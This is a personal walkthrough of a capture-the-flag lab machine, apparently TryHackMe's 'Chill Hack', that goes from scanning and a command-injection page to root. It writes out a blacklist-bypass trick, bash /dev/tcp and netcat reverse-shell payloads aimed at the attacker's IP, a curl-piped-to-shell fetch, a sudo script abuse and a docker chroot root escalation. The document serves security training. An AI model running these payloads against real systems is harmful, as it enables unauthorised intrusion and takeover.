### IP `10.10.32.71`

1. Nmap

```─(kali㉿kali)-[~]
└─$ nmap -Pn -A -T4 10.10.32.71  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 14:36 EST
Nmap scan report for 10.10.32.71
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.46.150
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)```
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds
```

2. First thing - accessing ftp on 21, there is a file:
```
─(kali㉿kali)-[~]
└─$ ftp 10.10.32.71      
Connected to 10.10.32.71.
220 (vsFTPd 3.0.3)
Name (10.10.32.71:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (70.5949 kB/s)
```

┌──(kali㉿kali)-[~]
└─$ cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

3. Gobuster

```
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.32.71 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.32.71
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/09 14:37:05 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/09 14:39:23 Finished
===============================================================
                                                             ```
4. In /secret there is an empty field, time for sqlmap (launched in the background)
http://10.10.32.71/secret/

I tried ls ---> Are you a hacker?
I tried pwd --> it gave me a path
I tried sudo-l ---> it gave me username `apaar` and a path to script

```
Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh 
```

# So I try
```
sudo -u apaar /home/apaar/.helpline.sh
```

and I get   Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time! 

# I also try
<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>
and launch netcat in the same time but there is nothing, and no message, so maybe lets check websource and also launch burp
----> nothing

# Id - works

# find / -perm -u=s -type f 2>/dev/null” 
---> shows list of suid binaries

/usr/lib/openssh/ssh-keysign 
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic 
/usr/lib/snapd/snap-confine 
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/lib/eject/dmcrypt-get-device 
/usr/bin/sudo 
/usr/bin/newgidmap 
/usr/bin/gpasswd 
/usr/bin/newuidmap 
/usr/bin/traceroute6.iputils 
/usr/bin/newgrp 
/usr/bin/pkexec
 /usr/bin/passwd 
 /usr/bin/at 
 /usr/bin/chfn 
 /usr/bin/chsh 
 /bin/su 
 /bin/mount 
 /bin/fusermount 
 /bin/ping 
 /bin/umount 


  /usr/bin/passwd  ----> gives changing password for www-data

  # sudo -u /home/apaar/.helpline.sh  bash ---> doesnt work

# command has to be bypassed by a slash e.g `c\at index.php` which gives a list of blacklisted commands:

                  $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');



Create a script that gives reverse shell
bash -c 'exec bash -i &>/dev/tcp/10.6.46.150/4444 <&1'

and run python server:
python3 -m http.server

and then execute curl with bash as backslash to execute it and bypass filter


curl 10.6.46.150:8000/shell.sh | b\ash



# www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh -q /dev/null
sudo -u apaar /home/apaar/.helpline.sh -q /dev/null

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: bash -p
bash -p
Hello user! I am bash -p,  Please enter your message: bash -p
bash -p
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
cat /home/apaar/local.txt
cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}


It is possible to become apaar with this script

# i am apaar now


sudo /home/apaar/.helpline.sh -q /dev/null

In /home/apaar/.ssh folder there is a file authorized_keys with private key of root


ssh -i authorized_keys root@localhost -p 9001

# We create ssh keys for appar `ssh-keygen apaar` on local machine, and then add .pub to authorized_keys on server where we have shell, and then 

ssh -L 9001:127.0.0.1:9001 -i apaar apaar@10.10.32.71

-L -----> forwarding

to connect to server directly and be able to access `localhost:127.0.0.1` from local machine

where there is a login panel with user / pass to type in

# Besides, there is a folder `cd /var/www/files`

apaar@ubuntu:~$ cd /var/www/files
apaar@ubuntu:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
apaar@ubuntu:/var/www/files$ ls -lah
total 28K
drwxr-xr-x 3 root root 4.0K Oct  3 04:40 .
drwxr-xr-x 4 root root 4.0K Oct  3 04:01 ..
-rw-r--r-- 1 root root  391 Oct  3 04:01 account.php
-rw-r--r-- 1 root root  453 Oct  3 04:02 hacker.php
drwxr-xr-x 2 root root 4.0K Oct  3 06:30 images
-rw-r--r-- 1 root root 1.2K Oct  3 04:02 index.php
-rw-r--r-- 1 root root  545 Oct  3 04:07 style.css
apaar@ubuntu:/var/www/files$ cat hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
apaar@ubuntu:/var/www/files$ cd images


and there are two files inside

apaar@ubuntu:/var/www/files/images$ ls -lah
total 2.1M
drwxr-xr-x 2 root root 4.0K Oct  3 06:30 .
drwxr-xr-x 3 root root 4.0K Oct  3 04:40 ..
-rw-r--r-- 1 root root 2.0M Oct  3 04:03 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root  68K Oct  3 04:24 hacker-with-laptop_23-2147985341.jpg
apaar@ubuntu:/var/www/files/images$ 

# One of images has a zip file inside

IWQwbnRLbjB3bVlwQHNzdzByZA==

!d0ntKn0wmYp@ssw0rd
anurodh


# anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

with docker it is possible to escalat to root

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# We are root

root@3ce9e19f5bf1:/# cd /root
root@3ce9e19f5bf1:~# ls -lah
total 68K
drwx------  6 root root 4.0K Oct  4 14:13 .
drwxr-xr-x 24 root root 4.0K Oct  3 03:33 ..
-rw-------  1 root root    0 Oct  4 14:14 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Oct  3 06:40 .cache
drwx------  3 root root 4.0K Oct  3 05:37 .gnupg
-rw-------  1 root root  370 Oct  4 07:36 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  12K Oct  4 07:44 .proof.txt.swp
drwx------  2 root root 4.0K Oct  3 03:40 .ssh
drwxr-xr-x  2 root root 4.0K Oct  3 04:07 .vim
-rw-------  1 root root  12K Oct  4 14:13 .viminfo
-rw-r--r--  1 root root  166 Oct  3 03:55 .wget-hsts
-rw-r--r--  1 root root 1.4K Oct  4 07:42 proof.txt
root@3ce9e19f5bf1:~# cat proof.txt


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a



root@3ce9e19f5bf1:~# 
